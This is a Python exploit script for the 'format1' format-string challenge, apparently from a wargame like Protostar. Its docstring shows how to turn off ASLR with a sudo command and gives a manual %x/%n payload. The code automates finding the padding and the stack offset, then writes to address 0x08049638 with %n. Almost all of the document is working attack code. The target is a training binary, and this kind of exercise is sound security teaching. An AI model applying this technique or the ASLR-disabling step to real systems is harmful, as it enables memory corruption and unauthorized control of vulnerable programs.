#!/usr/bin/python

'''
DISABLE ASLR
According to an article How Effective is ASLR on Linux Systems?, you can configure ASLR in Linux using the /proc/sys/kernel/randomize_va_space interface.

    The following values are supported:

        0 - No randomization. Everything is static.
        1 - Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
        2 - Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.

So, to disable it, run

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

and to enable it again, run

echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

MANUAL SOLUTION
./format1 "`python -c "print '\x38\x96\x04\x08  ' + '%x '*148+'%x %x %x %x %x %x %x %x %n    '"`"
# This was a bear to 'walk in' manually
# PRO TIP:  Watch out for stack alignment
'''

from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()
from struct import pack

BINARY_NAME = "format1"


def main():
    # LOCAL VARIABLES
    currEnv = os.environ.copy()
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    newAddr = "\x38\x96\x04\x08"
    padding = ""
    exploitMult = 1000
    formatString = "%x"
    exploit = formatString * exploitMult
    payload = ""
    commandList = []
    foundIt = 0  # Store the index of the discovered newAddr here
    success = True

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # RUN IT
    # 1. Determine padding necessary for byte alignment
    while True and success == True:
        commandList = [absBinFilename]
        payload = newAddr + padding + exploit
        commandList.append(payload)
        binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = PIPE)
        if binary is not None:
            tmpRet = binary.communicate()
            if tmpRet[0]:
                # print(tmpRet[0])  # DEBUGGING
                if tmpRet[0].find("8049638") >= 0:
                    # print(tmpRet[0])  # DEBUGGING
                    break
                else:
                    # print("Try again")  # DEBUGGING
                    padding += " "
            elif tmpRet[1]:
                print("Error:\t{}".format(tmpRet[1]))
                success = False
            else:
                print("Nothing")
                success = False

    # 2. Skinny down the exploit length to home in on newAddr
    while exploitMult > 0 and success == True:
        commandList = [absBinFilename]
        exploit = formatString * exploitMult
        payload = newAddr + padding + exploit
        commandList.append(payload)
        binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = PIPE)
        if binary is not None:
            tmpRet = binary.communicate()
            if tmpRet[0]:
                # print(tmpRet[0])  # DEBUGGING
                if tmpRet[0].find("8049638") >= 0:
                    # print("Still here:\n{}".format(tmpRet[0]))
                    exploitMult -= formatString.__len__()
                else:
                    # print("Not here")  # DEBUGGING
                    # print("Exploit Multiple:\t{}".format(exploitMult))  # DEBUGGING
                    # exploitMult -= 1
                    # pass
                    exploitMult += formatString.__len__()
                    break
            elif tmpRet[1]:
                print("Error:\t{}".format(tmpRet[1]))
                success = False
            else:
                print("Nothing")
                success = False

    # 3. Modify exploit to isolate newAddr
    while success == True:
        # print("Exploit length:\t{}".format(exploit.__len__()))  # DEBUGGING
        commandList = [absBinFilename]
        payload = newAddr + padding + exploit
        commandList.append(payload)
        binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = PIPE)
        if binary is not None:
            tmpRet = binary.communicate()
            if tmpRet[0]:
                # print(tmpRet[0])  # DEBUGGING
                if tmpRet[0].find("8049638") >= 0:
                    # print("Still here:\n{}".format(tmpRet[0]))  # DEBUGGING
                    # print("Old Exploit:\t{}".format(exploit))  # DEBUGGING
                    exploit = (exploit[::-1].replace("%x"[::-1], "%n"[::-1], 1))[::-1]
                    # print("NEW Exploit:\t{}".format(exploit))  # DEBUGGING
                    break
                else:
                    # print("Not here")  # DEBUGGING
                    exploit += formatString
                    # success = False
            elif tmpRet[1]:
                print("Error:\t{}".format(tmpRet[1]))
                success = False
            else:
                print("Nothing")
                success = False

    # print("Exploit length:\t{}".format(exploit.__len__()))  # DEBUGGING

    # 4. Run it for real
    commandList = [absBinFilename]
    payload = newAddr + padding + exploit
    commandList.append(payload)
    binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = PIPE)
    if binary is not None:
        tmpRet = binary.communicate()
        if tmpRet[0]:
            print(tmpRet[0])
        elif tmpRet[1]:
            print("Error:\t{}".format(tmpRet[1]))
            success = False
        else:
            print("Nothing")
            success = False

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))
